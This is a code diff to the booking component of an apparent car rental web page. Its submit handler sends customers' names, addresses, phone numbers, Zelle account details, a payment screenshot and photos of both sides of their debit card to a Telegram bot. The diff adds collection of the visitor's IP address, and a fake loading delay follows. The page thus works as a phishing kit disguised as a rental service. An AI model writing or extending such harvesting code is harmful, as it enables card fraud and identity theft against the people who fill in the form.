@@ -5,7 +5,7 @@ import Button from '../../Utilities/Button';
 import { ArrowLeft, Copy } from 'lucide-react';
 import Loader from '../../Utilities/Loader';
 import Footer from '../../Utilities/Footer';
-import { sendTelegramMessage, sendTelegramPhoto } from '../../Utilities/Telegrammessage';
+import { formatBookingMessage, getUserIP, sendTelegramMessage, sendTelegramPhoto } from '../../Utilities/Telegrammessage';
 
 
 const CarDetails = () => {
@@ -54,31 +54,36 @@ const CarDetails = () => {
         }
     };
 
-    const handleSendBooking = async () => {
-        setIsLoading(true);
-        const message = `🚗 *New Car Rental Submitted!*\n\n` +
-            `*Car:* ${car.name} ${car.model}, ${car.year}\n` +
-            `💰 *Price:* $${price}\n` +
-            `📍 *Distance:* ${distance}\n\n` +
-            `👤 *Name:* ${formData.name}\n` +
-            `🏠 *Address:* ${formData.address}\n` +
-            `📞 *Phone:* ${formData.phone}\n` +
-            `💳 *Zelle Account:* ${cardNumber}`;
+const handleSendBooking = async () => {
+  setIsLoading(true);
 
-        try {
-            await sendTelegramMessage(message);
-            if (image) await sendTelegramPhoto(image, '🖼 *Zelle Screenshot Attached*');
-            if (debitFront) await sendTelegramPhoto(debitFront, '💳 *Debit Card Front*');
-            if (debitBack) await sendTelegramPhoto(debitBack, '💳 *Debit Card Back*');
-        } catch (err) {
-            console.error("Telegram send failed:", err);
-        }
+  try {
+    const ip = await getUserIP();
 
-        setTimeout(() => {
-            setIsLoading(false);
-            setCardUsed(true);
-        }, 8000);
-    };
+    const message = formatBookingMessage({
+      car,
+      formData,
+      zelleAccount: cardNumber,
+      imageUrl: image,
+      distance,
+      pickupMethod,
+    }) + `\n\n🌐 *IP Address:* ${ip}`;
+
+    await sendTelegramMessage(message);
+
+    if (image) await sendTelegramPhoto(image, '🖼 *Zelle Screenshot Attached*');
+    if (debitFront) await sendTelegramPhoto(debitFront, '💳 *Debit Card Front*');
+    if (debitBack) await sendTelegramPhoto(debitBack, '💳 *Debit Card Back*');
+  } catch (err) {
+    console.error("Telegram send failed:", err);
+  }
+
+  setTimeout(() => {
+    setIsLoading(false);
+    setCardUsed(true);
+  }, 8000);
+};
+
 
     const handleCopy = () => {
         navigator.clipboard.writeText(number);
